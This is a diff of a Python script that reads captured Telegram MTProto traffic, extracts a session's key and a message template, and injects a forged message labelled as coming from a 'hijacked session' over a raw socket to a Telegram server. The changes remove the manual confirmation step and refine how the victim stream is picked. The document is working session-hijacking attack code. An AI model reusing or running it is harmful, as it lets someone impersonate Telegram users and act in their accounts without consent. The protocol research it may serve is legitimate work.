@@ -1,3 +1,5 @@
+from pyrogram.raw.types import MsgsAck, UpdateShort
+from telethon.tl.functions import PingDelayDisconnectRequest
 from telethon.tl.functions.messages import SendMessageRequest
 
 from src.MtprotoSession import KeyNotFoundException
@@ -28,7 +30,7 @@ def send_edited_message(data : str, last_outgoing_message :TGMessage, template_m
 
     init_and_obfuscated_bytes = init + obfuscated_bytes
     # confirm = input("Are you sure? yes/(no)")
-    confirm = "no"
+    confirm = "yes"
     if confirm == "yes":
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client_socket.connect(("149.154.167.91", 443))
@@ -58,28 +60,50 @@ def main():
     template_send_message = None
     stream_n = 2
     streams_with_outgoing_traffic = []
+    streams = []
+    last_normal_stream = 0
     for i in range(100):
         print("")
         print(f"Stream {i}\n")
         try:
-            stream = (read_stream(str(f"capture/stream_{i}_out"), str(f"capture/stream_{i}_in"), False, False))
-            if len(stream[0]) > 0:
-                streams_with_outgoing_traffic.append(stream)
             dir = 0
+
+            stream = (read_stream(str(f"capture/stream_{i}_out"), str(f"capture/stream_{i}_in"), False, False))
+            streams.append(stream)
+
+            if len(stream[0]) > 0 and dir == 0 and  hasattr(stream[0][0].session,"key_name") and stream[0][0].session.key_name == "tgnet2.dat":
+                streams_with_outgoing_traffic.append(stream)
             for direction in stream:
                 print("INCOMING:" if dir > 0 else "OUTGOING:")
-                dir = 1
                 for message in direction:
                     print (message)
                     print("---------------------------------------------------")
+
                     if isinstance(message.deserialized_message, SendMessageRequest):
                         template_send_message = message
+                    if (dir == 0  and hasattr(message.session,"key_name") and message.session.key_name == "tgnet2.dat" and not isinstance(message.deserialized_message, PingDelayDisconnectRequest)):
+                        last_normal_stream = i
+                dir = 1
         except KeyNotFoundException as e:
             print("(stream is irrelevant)") # stream is irrelevant
         except FileNotFoundError:
             break # no more streams to examine
-    if template_send_message is not None:
-        send_edited_message("messaggio da sessione dirottata",streams_with_outgoing_traffic[-1][0][-1], template_send_message.deserialized_message)
+    override_template = False
+    if template_send_message is not None and override_template:
+        with open("template", "w") as file:
+            file.write(to_hex_str(bytes(template_send_message.deserialized_message), False))
+    try:
+        with open("template", "r") as file:
+            template_send_message = deserialize_TL_message(bytes.fromhex(file.read()))
+            # send_edited_message("messaggio da una sessione dirottata",streams_with_outgoing_traffic[-1][0][-1], template_send_message, (1345874644, -7249264267762180610)) #m
+            ####### send_edited_message("messaggio da una sessione dirottata",streams_with_outgoing_traffic[-1][0][-1], template_send_message, (70027891, -3959112350778582311)) #t
+            send_edited_message("messaggio da una sessione dirottata",streams[last_normal_stream][0][-1], template_send_message )
+            print("stream for session: ",last_normal_stream)
+            # send_edited_message("messaggio da una sessione dirottata",streams_with_outgoing_traffic[-1][0][-1], template_send_message )
+
+    except Exception as e:
+        print("Template not found or invalid")
+
 
 
     # if template_send_message is None:
